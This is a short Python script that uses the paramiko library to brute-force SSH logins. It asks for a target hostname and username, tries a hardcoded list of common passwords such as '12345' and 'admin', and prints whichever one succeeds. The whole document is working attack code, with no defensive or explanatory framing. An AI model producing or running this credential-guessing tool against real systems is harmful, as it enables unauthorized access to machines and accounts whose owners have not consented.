import paramiko 

def ssh_brute_force(hostname, username, password_list): 
    client = paramiko.SSHClient() 
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy()) 
    for password in password_list: 
        try: 
            client.connect(hostname, username=username, password=password) 
            print(f"Password found: {password}") 
            break 
        except paramiko.AuthenticationException: 
            print(f"Failed: {password}") 

if __name__ == "__main__": 
    hostname = input("Enter the target hostname/IP: ") 
    username = input("Enter the username: ") 
    password_list = ["12345", "password", "letmein", "admin"] 
    ssh_brute_force(hostname, username, password_list)